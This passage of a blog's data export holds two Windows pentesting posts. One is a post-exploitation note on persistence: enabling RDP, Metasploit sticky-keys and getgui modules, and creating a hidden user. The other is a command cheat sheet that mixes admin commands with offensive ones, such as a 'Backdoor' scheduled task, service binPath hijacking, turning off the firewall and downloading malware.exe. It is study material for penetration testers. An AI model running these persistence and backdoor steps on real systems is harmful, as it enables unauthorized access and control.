/f\n```\n\n<br>\n\n---\n---","slug":"Pentesting/Windows/6","published":1,"date":"2024-09-23T06:18:55.873Z","updated":"2024-09-23T06:18:55.873Z","comments":1,"layout":"post","photos":[],"_id":"cm1emkmi2001i6gvgbwkyc8rk","content":"<hr>\n<p>Step 6: Post exploitation.<br>Install backdoors, extract credentials and relevant data, clean step foots. </p>\n<hr>\n<span id=\"more\"></span>\n\n<br>\n\n\n<h2 id=\"Persistence\"><a href=\"#Persistence\" class=\"headerlink\" title=\"Persistence\"></a>Persistence</h2><h3 id=\"RDP\"><a href=\"#RDP\" class=\"headerlink\" title=\"RDP\"></a>RDP</h3><pre><div class=\"caption\"><span>Allow RDP through Registry (as administrator)</span></div><code class=\"highlight batch\">reg add &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f</code></pre>\n<pre><div class=\"caption\"><span>Allow RDP through the Windows Firewall (as administrator)</span></div><code class=\"highlight batch\">netsh advfirewall firewall set rule group=&quot;remote desktop&quot; new enable=Yes</code></pre>\n<pre><div class=\"caption\"><span>Allow RDP through Powershell (as administrator)</span></div><code class=\"highlight pwsh\"><span class=\"built_in\">Set-ItemProperty</span> <span class=\"literal\">-Path</span> <span class=\"string\">&quot;HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server&quot;</span> <span class=\"literal\">-Name</span> <span class=\"string\">&quot;fDenyTSConnections&quot;</span> <span class=\"literal\">-Value</span> <span class=\"number\">0</span></code></pre>\n<br>\n<pre><div class=\"caption\"><span>Metasploit - show GUI</span></div><code class=\"highlight bash\">run getgui -e -u <span class=\"string\">&#x27;user&#x27;</span> -p <span class=\"string\">&#x27;password&#x27;</span></code></pre>\n<br>\n<pre><div class=\"caption\"><span>Metasploit - sticky keys</span></div><code class=\"highlight bash\">use post/windows/manage/sticky_keys\n<span class=\"built_in\">set</span> session 1\nexploit</code></pre>\n\n<br>\n\n<pre><div class=\"caption\"><span>Create a hidden user</span></div><code class=\"highlight batch\">net user hiddenuser &quot;password&quot; /add\nreg add &quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList&quot; /v hiddenuser /t REG_DWORD /d 0 /f</code></pre>\n\n<br>\n\n<hr>\n<hr>\n","excerpt":"<hr>\n<p>Step 6: Post exploitation.<br>Install backdoors, extract credentials and relevant data, clean step foots. </p>\n<hr>","more":"<br>\n\n\n<h2 id=\"Persistence\"><a href=\"#Persistence\" class=\"headerlink\" title=\"Persistence\"></a>Persistence</h2><h3 id=\"RDP\"><a href=\"#RDP\" class=\"headerlink\" title=\"RDP\"></a>RDP</h3><pre><div class=\"caption\"><span>Allow RDP through Registry (as administrator)</span></div><code class=\"highlight batch\">reg add &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f</code></pre>\n<pre><div class=\"caption\"><span>Allow RDP through the Windows Firewall (as administrator)</span></div><code class=\"highlight batch\">netsh advfirewall firewall set rule group=&quot;remote desktop&quot; new enable=Yes</code></pre>\n<pre><div class=\"caption\"><span>Allow RDP through Powershell (as administrator)</span></div><code class=\"highlight pwsh\"><span class=\"built_in\">Set-ItemProperty</span> <span class=\"literal\">-Path</span> <span class=\"string\">&quot;HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server&quot;</span> <span class=\"literal\">-Name</span> <span class=\"string\">&quot;fDenyTSConnections&quot;</span> <span class=\"literal\">-Value</span> <span class=\"number\">0</span></code></pre>\n<br>\n<pre><div class=\"caption\"><span>Metasploit - show GUI</span></div><code class=\"highlight bash\">run getgui -e -u <span class=\"string\">&#x27;user&#x27;</span> -p <span class=\"string\">&#x27;password&#x27;</span></code></pre>\n<br>\n<pre><div class=\"caption\"><span>Metasploit - sticky keys</span></div><code class=\"highlight bash\">use post/windows/manage/sticky_keys\n<span class=\"built_in\">set</span> session 1\nexploit</code></pre>\n\n<br>\n\n<pre><div class=\"caption\"><span>Create a hidden user</span></div><code class=\"highlight batch\">net user hiddenuser &quot;password&quot; /add\nreg add &quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList&quot; /v hiddenuser /t REG_DWORD /d 0 /f</code></pre>\n\n<br>\n\n<hr>\n<hr>"},{"title":"Windows - Commands - part 1","date":"2024-08-03T09:00:00.000Z","toc":true,"_content":"\n---\n.\n\n---\n<!-- more -->\n\n## General Information\n\n### User Information\n```bat\necho %username%                         REM Display the current username\nwhoami /all                             REM Show detailed user information, groups, privileges, and SID\nnet user                                REM List all user accounts on the local machine\nnet localgroup administrators           REM List members of the Administrators group\n```\n\n<br>\n\n### System Information\n```bat\nsysteminfo                              REM Display detailed system configuration, OS version, etc.\nwmic qfe list brief /format:table       REM List installed hotfixes and patches\nwmic os get caption, version, csname    REM Display the Windows version, OS name, and computer name\nwmic product get name, version          REM List all installed software with versions (useful for finding vulnerable software)\n```\n\n<br>\n\n### Registry Information\n```bat\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run               REM List programs set to run at startup\nreg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyServer  REM Check proxy settings\nreg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v RestrictAnonymous  REM Check if anonymous enumeration of SAM accounts is restricted\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated  REM Check if MSI packages can be installed with elevated privileges\n```\n\n<br>\n\n## Filesystem\n\n### Directory and File Operations with `dir`\n```bat\ndir /A:D                                 REM List directories only\ndir /A:HS                                REM List hidden and system files\ndir /O:S                                 REM Sort files by size\ndir /Q                                   REM Show file owners\ndir /T:C                                 REM Show creation time\ndir /S /B                                REM Recursive search, bare format (useful for finding specific files like passwords or sensitive documents)\n```\n\n<br>\n\n### File Searching with `findstr`\n```bat\nfindstr /si \"password\" *.txt             REM Search for the word \"password\" in all .txt files (case-insensitive)\nfindstr /R /S \"regex_pattern\" *.config   REM Search using regular expressions across all .config files recursively\n```\n\n<br>\n\n### File and Directory Takeover\n```bat\ntakeown /F <file_or_folder> /A           REM Take ownership of a file or folder\nicacls <file_or_folder> /grant %username%:F  REM Grant full control to the current user\n```\n\n<br>\n\n## Permissions\n\n### `icacls` - Managing Permissions\n```bat\nicacls <file_or_folder>                   REM Show permissions for a file or folder\nicacls <file_or_folder> /grant <user>:(F) REM Grant full control to a user\nicacls <file_or_folder> /deny <user>:(D)  REM Deny delete permissions to a user\nicacls <file_or_folder> /inheritance:e    REM Enable inheritance for a file or folder\nicacls <file_or_folder> /save aclfile.txt REM Backup ACLs to a file\nicacls <file_or_folder> /restore aclfile.txt  REM Restore ACLs from a file\nicacls <file_or_folder> /reset            REM Reset permissions to default\n```\n```batch\nF    : Full control  Grants complete access to the file or directory, including the ability to modify permissions.\nM    : Modify  Allows reading, writing, and deleting the file or directory but does not include permission changes.\nRX   : Read and execute  Allows reading the file and executing it (if it's executable), or listing the directory and accessing its contents.\nR    : Read  Permits reading the file or listing the directory's contents.\nW    : Write  Allows writing to the file or adding files to the directory.\nD    : Delete  Grants the ability to delete the file or directory.\nX    : Traverse  Permits moving through a directory to access other files or directories.\nS    : Synchronize  Enables synchronization of operations on the file or directory, useful for process synchronization.\n```\n\n<br>\n\n### Access Control with `accesschk`\n```bat\naccesschk.exe -uws <username> *           REM Show all objects with write access for a specific user (Sysinternals)\naccesschk.exe -p <processname>            REM Check permissions on a specific process (useful for privilege escalation)\n```\n\n<br>\n\n## Networking\n\n### Network Configuration with `ipconfig`\n```bat\nipconfig /all                             REM Display all network configuration\nipconfig /displaydns                      REM Show the DNS resolver cache\nipconfig /flushdns                        REM Flush DNS resolver cache (useful for clearing potential logs or testing DNS issues)\nipconfig /release                         REM Release the current IP address\nipconfig /renew                           REM Renew the IP address\n```\n\n<br>\n\n### Network Connections with `netstat`\n```bat\nnetstat -an                               REM Show all active connections and listening ports\nnetstat -b                                REM Show the executable tied to each connection\nnetstat -r                                REM Show the routing table\nnetstat -o                                REM Show active connections with the associated process ID (PID)\nnetstat -ano | findstr :80                REM Find connections on port 80\n```\n\n<br>\n\n### ARP Cache with `arp`\n```bat\narp -a                                    REM Show ARP cache\narp -d                                    REM Clear ARP cache\n```\n\n<br>\n\n### Windows Firewall with `netsh`\n```bat\nnetsh advfirewall show currentprofile     REM Display the active firewall profile settings\nnetsh advfirewall set currentprofile state off  REM Disable the active firewall profile (requires admin)\nnetsh advfirewall firewall add rule name=\"Allow SSH\" protocol=TCP dir=in localport=22 action=allow  REM Add a firewall rule to allow SSH on port 22\n```\n\n<br>\n\n### Shares with `net`\n```bat\nnet share                                REM List all shared folders on the local machine\nnet view \\\\hostname                       REM List shared resources on a remote machine\nnet use Z: \\\\hostname\\sharename /user:username password  REM Map a network drive using specific credentials\n```\n\n<br>\n\n### `smbclient` for SMB Connections (from Linux/Windows with Cygwin)\n```bat\nsmbclient -L \\\\hostname -U username       REM List shares on a remote SMB server\nsmbclient //hostname/sharename -U username  REM Connect to a specific share\n```\n\n<br>\n\n### `powershell` Networking\n```bat\npowershell \"Test-Connection -ComputerName hostname -Count 4\"  REM Ping a host 4 times using PowerShell\npowershell \"Get-NetTCPConnection -State Listen\"  REM List all listening ports using PowerShell\npowershell \"Invoke-WebRequest -Uri http://example.com\"  REM Make a web request using PowerShell\n```\n\n<br>\n\n## Services\n\n### Service Management with `sc`\n```bat\nsc query <service_name>                   REM Query the status of a service\nsc qc <service_name>                      REM Query the service configuration (useful for finding paths and weak permissions)\nsc stop <service_name>                    REM Stop a service\nsc start <service_name>                   REM Start a service\nsc config <service_name> binPath= \"C:\\path\\to\\malicious.exe\"  REM Change the executable path for a service (privilege escalation technique)\nsc delete <service_name>                  REM Delete a service\n```\n\n<br>\n\n### Windows Services with `wmic`\n\n```bat\nwmic service get name, displayname, startmode, state  REM List all services, their display names, start modes, and current states\nwmic process where \"name='svchost.exe'\" get processid, commandline  REM List all instances of svchost with their command lines\n```\n\n<br>\n\n## Task Management\n\n### Process Management with `tasklist` and `taskkill`\n```bat\ntasklist                                  REM List all running processes\ntasklist /svc                             REM List services hosted in each svchost process\ntasklist /v                               REM Display detailed information about each process, including window title\ntaskkill /PID <PID>                       REM Kill a process by PID\ntaskkill /IM <process_name>               REM Kill a process by name\ntaskkill /F /PID <PID>                    REM Forcefully kill a process by PID\n```\n\n<br>\n\n### Scheduling Tasks with `schtasks`\n```bat\nschtasks /query /fo LIST /v               REM List all scheduled tasks with detailed information\nschtasks /create /tn \"Backdoor\" /tr \"C:\\path\\to\\malicious.exe\" /sc daily /st 12:00  REM Create a scheduled task to run a malicious file daily at noon\nschtasks /delete /tn \"TaskName\" /f        REM Delete a scheduled task by name, without prompting for confirmation\n```\n\n<br>\n\n## PowerShell - Advanced Commands\n\n### File and Directory Enumeration\n```bat\nGet-ChildItem -Recurse -Force | Where-Object { $_.Attributes -match \"Hidden\" }  REM List all hidden files recursively\nGet-Acl C:\\path\\to\\file.txt | Format-List  REM Get detailed ACL information for a specific file\n```\n\n<br>\n\n### Downloading Files\n```bat\nInvoke-WebRequest -Uri http://example.com/malware.exe -OutFile C:\\path\\to\\malware.exe  REM Download a file from a URL and save it locally\n```\n\n<br>\n\n### Running Commands Remotely\n```bat\nInvoke-Command -ComputerName hostname -ScriptBlock { Get-Service }  REM Run a command on a remote computer to list services\nEnter-PSSession -ComputerName hostname  REM Establish an interactive session with a remote computer\n```\n\n<br>\n\n## Miscellaneous\n\n### Environment Variables\n```bat\nset                                        REM List all environment variables\nsetx VAR_NAME \"Value\"                      REM Set a new environment variable permanently\nset path=C:\\newpath;%path%                 REM Temporarily modify the PATH environment variable\n```\n\n<br>\n\n### System Control\n```bat\nshutdown /s /f /t 0                        REM Shutdown the computer immediately\nshutdown /r /f /t 0                        REM Restart the computer immediately\n```\n\n<br>\n\n---\n---","source":"_posts/Pentesting/Windows/commands.md","raw":"---\ntitle: Windows - Commands - part 1\ndate: 2024-08-03 12:00:00\ncategories:\n  - Pentesting\n  - Windows\ntags:\n  - Pentesting\n  - Windows\ntoc: true\n---\n\n---\n.\n\n---\n<!-- more -->\n\n## General Information\n\n### User Information\n```bat\necho %username%                         REM Display the current username\nwhoami /all                             REM Show detailed user information, groups, privileges, and SID\nnet user                                REM List all user accounts on the local machine\nnet localgroup administrators           REM List members of the Administrators group\n```\n\n<br>\n\n### System Information\n```bat\nsysteminfo                              REM Display detailed system configuration, OS version, etc.\nwmic qfe list brief /format:table       REM List installed hotfixes and patches\nwmic os get caption, version, csname    REM Display the Windows version, OS name, and computer name\nwmic product get name, version          REM List all installed software with versions (useful for finding vulnerable software)\n```\n\n<br>\n\n### Registry Information\n```bat\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run               REM List programs set to run at startup\nreg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyServer  REM Check proxy settings\nreg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v RestrictAnonymous  REM Check if anonymous enumeration of SAM accounts is restricted\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated  REM Check if MSI packages can be installed with elevated privileges\n```\n\n<br>\n\n## Filesystem\n\n### Directory and File Operations with `dir`\n```bat\ndir /A:D                                 REM List directories only\ndir /A:HS                                REM List hidden and system files\ndir /O:S                                 REM Sort files by size\ndir /Q                                   REM Show file owners\ndir /T:C                                 REM Show creation time\ndir /S /B                                REM Recursive search, bare format (useful for finding specific files like passwords or sensitive documents)\n```\n\n<br>\n\n### File Searching with `findstr`\n```bat\nfindstr /si \"password\" *.txt             REM Search for the word \"password\" in all .txt files (case-insensitive)\nfindstr /R /S \"regex_pattern\" *.config   REM Search using regular expressions across all .config files recursively\n```\n\n<br>\n\n### File and Directory Takeover\n```bat\ntakeown /F <file_or_folder> /A           REM Take ownership of a file or folder\nicacls <file_or_folder> /grant %username%:F  REM Grant full control to the current user\n```\n\n<br>\n\n## Permissions\n\n### `icacls` - Managing Permissions\n```bat\nicacls <file_or_folder>                   REM Show permissions for a file or folder\nicacls <file_or_folder> /grant <user>:(F) REM Grant full control to a user\nicacls <file_or_folder> /deny <user>:(D)  REM Deny delete permissions to a user\nicacls <file_or_folder> /inheritance:e    REM Enable inheritance for a file or folder\nicacls <file_or_folder> /save aclfile.txt REM Backup ACLs to a file\nicacls <file_or_folder> /restore aclfile.txt  REM Restore ACLs from a file\nicacls <file_or_folder> /reset            REM Reset permissions to default\n```\n```batch\nF    : Full control  Grants complete access to the file or directory, including the ability to modify permissions.\nM    : Modify  Allows reading, writing, and deleting the file or directory but does not include permission changes.\nRX   : Read and execute  Allows reading the file and executing it (if it's executable), or listing the directory and accessing its contents.\nR    : Read  Permits reading the file or listing the directory's contents.\nW    : Write  Allows writing to the file or adding files to the directory.\nD    : Delete  Grants the ability to delete the file or directory.\nX    : Traverse  Permits moving through a directory to access other files or directories.\nS    : Synchronize  Enables synchronization of operations on the file or directory, useful for process synchronization.\n```\n\n<br>\n\n### Access Control with `accesschk`\n```bat\naccesschk.exe -uws <username> *           REM Show all objects with write access for a specific user (Sysinternals)\naccesschk.exe -p <processname>            REM Check permissions on a specific process (useful for privilege escalation)\n```\n\n<br>\n\n## Networking\n\n### Network Configuration with `ipconfig`\n```bat\nipconfig /all                             REM Display all network configuration\nipconfig /displaydns                      REM Show the DNS resolver cache\nipconfig /flushdns                        REM Flush DNS resolver cache (useful for clearing potential logs or testing DNS issues)\nipconfig /release                         REM Release the current IP address\nipconfig /renew                           REM Renew the IP address\n```\n\n<br>\n\n### Network Connections with `netstat`\n```bat\nnetstat -an                               REM Show all active connections and listening ports\nnetstat -b                                REM Show the executable tied to each connection\nnetstat -r                                REM Show the routing table\nnetstat -o                                REM Show active connections with the associated process ID (PID)\nnetstat -ano | findstr :80                REM Find connections on port 80\n```\n\n<br>\n\n### ARP Cache with `arp`\n```bat\narp -a                                    REM Show ARP cache\narp -d                                    REM Clear ARP cache\n```\n\n<br>\n\n### Windows Firewall with `netsh`\n```bat\nnetsh advfirewall show currentprofile     REM Display the active firewall profile settings\nnetsh advfirewall set currentprofile state off  REM Disable the active firewall profile (requires admin)\nnetsh advfirewall firewall add rule name=\"Allow SSH\" protocol=TCP dir=in localport=22 action=allow  REM Add a firewall rule to allow SSH on port 22\n```\n\n<br>\n\n### Shares with `net`\n```bat\nnet share                                REM List all shared folders on the local machine\nnet view \\\\hostname                       REM List shared resources on a remote machine\nnet use Z: \\\\hostname\\sharename /user:username password  REM Map a network drive using specific credentials\n```\n\n<br>\n\n### `smbclient` for SMB Connections (from Linux/Windows with Cygwin)\n```bat\nsmbclient -L \\\\hostname -U username       REM List shares on a remote SMB server\nsmbclient //hostname/sharename -U username  REM Connect to a specific share\n```\n\n<br>\n\n### `powershell` Networking\n```bat\npowershell \"Test-Connection -ComputerName hostname -Count 4\"  REM Ping a host 4 times using PowerShell\npowershell \"Get-NetTCPConnection -State Listen\"  REM List all listening ports using PowerShell\npowershell \"Invoke-WebRequest -Uri http://example.com\"  REM Make a web request using PowerShell\n```\n\n<br>\n\n## Services\n\n### Service Management with `sc`\n```bat\nsc query <service_name>                   REM Query the status of a service\nsc qc <service_name>                      REM Query the service configuration (useful for finding paths and weak permissions)\nsc stop <service_name>                    REM Stop a service\nsc start <service_name>                   REM Start a service\nsc config <service_name> binPath= \"C:\\path\\to\\malicious.exe\"  REM Change the executable path for a service (privilege escalation technique)\nsc delete <service_name>                  REM Delete a service\n```\n\n<br>\n\n### Windows Services with `wmic`\n\n```bat\nwmic service get name, displayname, startmode, state  REM List all services, their display names, start modes, and current states\nwmic process where \"name='svchost.exe'\" get processid, commandline  REM List all instances of svchost with their command lines\n```\n\n<br>\n\n## Task Management\n\n### Process Management with `tasklist` and `taskkill`\n```bat\ntasklist                                  REM List all running processes\ntasklist /svc                             REM List services hosted in each svchost process\ntasklist /v                               REM Display detailed information about each process, including window title\ntaskkill /PID <PID>                       REM Kill a process by PID\ntaskkill /IM <process_name>               REM Kill a process by name\ntaskkill /F /PID <PID>                    REM Forcefully kill a process by PID\n```\n\n<br>\n\n### Scheduling Tasks with `schtasks`\n```bat\nschtasks /query /fo LIST /v               REM List all scheduled tasks with detailed information\nschtasks /create /tn \"Backdoor\" /tr \"C:\\path\\to\\malicious.exe\" /sc daily /st 12:00  REM Create a scheduled task to run a malicious file daily at noon\nschtasks /delete /tn \"TaskName\" /f        REM Delete a scheduled task by name, without prompting for confirmation\n```\n\n<br>\n\n## PowerShell - Advanced Commands\n\n### File and Directory Enumeration\n```bat\nGet-ChildItem -Recurse -Force | Where-Object { $_.Attributes -match \"Hidden\" }  REM List all hidden files recursively\nGet-Acl C:\\path\\to\\file.txt | Format-List  REM Get detailed ACL information for a specific file\n```\n\n<br>\n\n### Downloading Files\n```bat\nInvoke-WebRequest -Uri http://example.com/malware.exe -OutFile C:\\path\\to\\malware.exe  REM Download a file from a URL and save it locally\n```\n\n<br>\n\n### Running Commands Remotely\n```bat\nInvoke-Command -ComputerName hostname -ScriptBlock { Get-Service }  REM Run a command on a remote computer to list services\nEnter-PSSession -ComputerName hostname  REM Establish an interactive session with a remote computer\n```\n\n<br>\n\n## Miscellaneous\n\n### Environment Variables\n```bat\nset                                        REM List all environment variables\nsetx VAR_NAME \"Value\"                      REM Set a new environment variable permanently\nset path=C:\\newpath;%path%                 REM Temporarily modify the PATH environment variable\n```\n\n<br>\n\n### System Control\n```bat\nshutdown /s /f /t 0                        REM Shutdown the computer immediately\nshutdown /r /f /t 0                        REM Restart the computer immediately\n```\n\n<br>\n\n---\n---","slug":"Pentesting/Windows/commands","published":1,"updated":"2024-09-23T06:18:55.873Z","comments":1,"layout":"post","photos":[],"_id":"cm1emkmi3001m6gvg5kpkch78","content":"<hr>\n<p>.</p>\n<hr>\n<span id=\"more\"></span>\n\n<h2 id=\"General-Information\"><a href=\"#General-Information\" class=\"headerlink\" title=\"General Information\"></a>General Information</h2><h3 id=\"User-Information\"><a href=\"#User-Information\" class=\"headerlink\" title=\"User Information\"></a>User Information</h3><pre><code class=\"highlight bat\"><span class=\"built_in\">echo</span> <span class=\"variable\">%username%</span>                         <span class=\"built_in\">REM</span> Display the current username\nwhoami /all                             <span class=\"built_in\">REM</span> Show detailed user information, groups, privileges, and SID\n<span class=\"built_in\">net</span> user                                <span class=\"built_in\">REM</span> List all user accounts on the local machine\n<span class=\"built_in\">net</span> localgroup administrators           <span class=\"built_in\">REM</span> List members of the Administrators group</code></pre>\n\n<br>\n\n<h3 id=\"System-Information\"><a href=\"#System-Information\" class=\"headerlink\" title=\"System Information\"></a>System Information</h3><pre><code class=\"highlight bat\">systeminfo                              <span class=\"built_in\">REM</span> Display detailed system configuration, OS version, etc.\nwmic qfe list brief /<span class=\"built_in\">format</span>:table       <span class=\"built_in\">REM</span> List installed hotfixes and patches\nwmic os get caption, version, csname    <span class=\"built_in\">REM</span> Display the Windows version, OS name, and computer name\nwmic product get name, version          <span class=\"built_in\">REM</span> List all installed software with versions (useful <span class=\"keyword\">for</span> finding vulnerable software)</code></pre>\n\n<br>\n\n<h3 id=\"Registry-Information\"><a href=\"#Registry-Information\" class=\"headerlink\" title=\"Registry Information\"></a>Registry Information</h3><pre><code class=\"highlight bat\">reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run               <span class=\"built_in\">REM</span> List programs <span class=\"built_in\">set</span> to run <span class=\"built_in\">at</span> startup\nreg query &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings&quot; /v ProxyServer  <span class=\"built_in\">REM</span> Check proxy settings\nreg query &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa&quot; /v RestrictAnonymous  <span class=\"built_in\">REM</span> Check <span class=\"keyword\">if</span> anonymous enumeration of SAM accounts is restricted\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated  <span class=\"built_in\">REM</span> Check <span class=\"keyword\">if</span> MSI packages can be installed with elevated privileges</code></pre>\n\n<br>\n\n<h2 id=\"Filesystem\"><a href=\"#Filesystem\" class=\"headerlink\" title=\"Filesystem\"></a>Filesystem</h2><h3 id=\"Directory-and-File-Operations-with-dir\"><a href=\"#Directory-and-File-Operations-with-dir\" class=\"headerlink\" title=\"Directory and File Operations with dir\"></a>Directory and File Operations with <code>dir</code></h3><pre><code class=\"highlight bat\"><span class=\"built_in\">dir</span> /A:D                                 <span class=\"built_in\">REM</span> List directories only\n<span class=\"built_in\">dir</span> /A:HS                                <span class=\"built_in\">REM</span> List hidden and system files\n<span class=\"built_in\">dir</span> /O:S                                 <span class=\"built_in\">REM</span> <span class=\"built_in\">Sort</span> files by size\n<span class=\"built_in\">dir</span> /Q                                   <span class=\"built_in\">REM</span> Show file owners\n<span class=\"built_in\">dir</span> /T:C                                 <span class=\"built_in\">REM</span> Show creation <span class=\"built_in\">time</span>\n<span class=\"built_in\">dir</span> /S /B                                <span class=\"built_in\">REM</span> Recursive search, bare <span class=\"built_in\">format</span> (useful <span class=\"keyword\">for</span> finding specific files like passwords or sensitive documents)</code></pre>\n\n<br>\n\n<h3 id=\"File-Searching-with-findstr\"><a href=\"#File-Searching-with-findstr\" class=\"headerlink\" title=\"File Searching with findstr\"></a>File Searching with <code>findstr</code></h3><pre><code class=\"highlight bat\"><span class=\"built_in\">findstr</span> /si &quot;password&quot; *.txt             <span class=\"built_in\">REM</span> Search <span class=\"keyword\">for</span> the word &quot;password&quot; <span class=\"keyword\">in</span> all .txt files (case-insensitive)\n<span class=\"built_in\">findstr</span> /R /S &quot;regex_pattern&quot; *.config   <span class=\"built_in\">REM</span> Search using regular expressions across all .config files recursively</code></pre>\n\n<br>\n\n<h3 id=\"File-and-Directory-Takeover\"><a href=\"#File-and-Directory-Takeover\" class=\"headerlink\" title=\"File and Directory Takeover\"></a>File and Directory Takeover</h3><pre><code class=\"highlight bat\">takeown /F &lt;file_or_folder&gt; /A           <span class=\"built_in\">REM</span> Take ownership of a file or folder\nicacls &lt;file_or_folder&gt; /grant <span class=\"variable\">%username%</span>:F  <span class=\"built_in\">REM</span> Grant full control to the current user</code></pre>\n\n<br>\n\n<h2 id=\"Permissions\"><a href=\"#Permissions\" class=\"headerlink\" title=\"Permissions\"></a>Permissions</h2><h3 id=\"icacls-Managing-Permissions\"><a href=\"#icacls-Managing-Permissions\" class=\"headerlink\" title=\"icacls - Managing Permissions\"></a><code>icacls</code> - Managing Permissions</h3><pre><code class=\"highlight bat\">icacls &lt;file_or_folder&gt;                   <span class=\"built_in\">REM</span> Show permissions <span class=\"keyword\">for</span> a file or folder\nicacls &lt;file_or_folder&gt; /grant &lt;user&gt;:(F) <span class=\"built_in\">REM</span> Grant full control to a user\nicacls &lt;file_or_folder&gt; /deny &lt;user&gt;:(D)  <span class=\"built_in\">REM</span> Deny delete permissions to a user\nicacls &lt;file_or_folder&gt; /inheritance:e    <span class=\"built_in\">REM</span> Enable inheritance <span class=\"keyword\">for</span> a file or folder\nicacls &lt;file_or_folder&gt; /save aclfile.txt <span class=\"built_in\">REM</span> Backup ACLs to a file\nicacls &lt;file_or_folder&gt; /<span class=\"built_in\">restore</span> aclfile.txt  <span class=\"built_in\">REM</span> <span class=\"built_in\">Restore</span> ACLs from a file\nicacls &lt;file_or_folder&gt; /reset            <span class=\"built_in\">REM</span> Reset permissions to default</code></pre>\n<pre><code class=\"highlight batch\">F    : Full control  Grants complete access to the file or directory, including the ability to modify permissions.\nM    : Modify  Allows reading, writing, and deleting the file or directory but does not include permission changes.\nRX   : Read and execute  Allows reading the file and executing it (if it&#x27;s executable), or listing the directory and accessing its contents.\nR    : Read  Permits reading the file or listing the directory&#x27;s contents.\nW    : Write  Allows writing to the file or adding files to the directory.\nD    : Delete  Grants the ability to delete the file or directory.\nX    : Traverse  Permits moving through a directory to access other files or directories.\nS    : Synchronize  Enables synchronization of operations on the file or directory, useful for process synchronization.</code></pre>\n\n<br>\n\n<h3 id=\"Access-Control-with-accesschk\"><a href=\"#Access-Control-with-accesschk\" class=\"headerlink\" title=\"Access Control with accesschk\"></a>Access Control with <code>accesschk</code></h3><pre><code class=\"highlight bat\">accesschk.exe -uws &lt;username&gt; *           <span class=\"built_in\">REM</span> Show all objects with write access <span class=\"keyword\">for</span> a specific user (Sysinternals)\naccesschk.exe -p &lt;processname&gt;            <span class=\"built_in\">REM</span> Check permissions on a specific process (useful <span class=\"keyword\">for</span> privilege escalation)</code></pre>\n\n<br>\n\n<h2 id=\"Networking\"><a href=\"#Networking\" class=\"headerlink\" title=\"Networking\"></a>Networking</h2><h3 id=\"Network-Configuration-with-ipconfig\"><a href=\"#Network-Configuration-with-ipconfig\" class=\"headerlink\" title=\"Network Configuration with ipconfig\"></a>Network Configuration with <code>ipconfig</code></h3><pre><code class=\"highlight bat\"><span class=\"built_in\">ipconfig</span> /all                             <span class=\"built_in\">REM</span> Display all network configuration\n<span class=\"built_in\">ipconfig</span> /displaydns                      <span class=\"built_in\">REM</span> Show the DNS resolver cache\n<span class=\"built_in\">ipconfig</span> /flushdns                        <span class=\"built_in\">REM</span> Flush DNS resolver cache (useful <span class=\"keyword\">for</span> clearing potential logs or testing DNS issues)\n<span class=\"built_in\">ipconfig</span> /release                         <span class=\"built_in\">REM</span> Release the current IP address\n<span class=\"built_in\">ipconfig</span> /renew                           <span class=\"built_in\">REM</span> Renew the IP address</code></pre>\n\n<br>\n\n<h3 id=\"Network-Connections-with-netstat\"><a href=\"#Network-Connections-with-netstat\" class=\"headerlink\" title=\"Network Connections with netstat\"></a>Network Connections with <code>netstat</code></h3><pre><code class=\"highlight bat\">netstat -an                               <span class=\"built_in\">REM</span> Show all active connections and listening ports\nnetstat -b                                <span class=\"built_in\">REM</span> Show the executable tied to each connection\nnetstat -r                                <span class=\"built_in\">REM</span> Show the routing table\nnetstat -o                                <span class=\"built_in\">REM</span> Show active connections with the associated process ID (PID)\nnetstat -ano | <span class=\"built_in\">findstr</span> :<span class=\"number\">80</span>                <span class=\"built_in\">REM</span> <span class=\"built_in\">Find</span> connections on port <span class=\"number\">80</span></code></pre>\n\n<br>\n\n<h3 id=\"ARP-Cache-with-arp\"><a href=\"#ARP-Cache-with-arp\" class=\"headerlink\" title=\"ARP Cache with arp\"></a>ARP Cache with <code>arp</code></h3><pre><code class=\"highlight bat\">arp -a                                    <span class=\"built_in\">REM</span> Show ARP cache\narp -d                                    <span class=\"built_in\">REM</span> Clear ARP cache</code></pre>\n\n<br>\n\n<h3 id=\"Windows-Firewall-with-netsh\"><a href=\"#Windows-Firewall-with-netsh\" class=\"headerlink\" title=\"Windows Firewall with netsh\"></a>Windows Firewall with <code>netsh</code></h3><pre><code class=\"highlight bat\">netsh advfirewall show currentprofile     <span class=\"built_in\">REM</span> Display the active firewall profile settings\nnetsh advfirewall <span class=\"built_in\">set</span> currentprofile state off  <span class=\"built_in\">REM</span> Disable the active firewall profile (requires admin)\nnetsh advfirewall firewall add rule name=&quot;Allow SSH&quot; protocol=TCP <span class=\"built_in\">dir</span>=<span class=\"keyword\">in</span> localport=<span class=\"number\">22</span> action=allow  <span class=\"built_in\">REM</span> Add a firewall rule to allow SSH on port <span class=\"number\">22</span></code></pre>\n\n<br>\n\n<h3 id=\"Shares-with-net\"><a href=\"#Shares-with-net\" class=\"headerlink\" title=\"Shares with net\"></a>Shares with 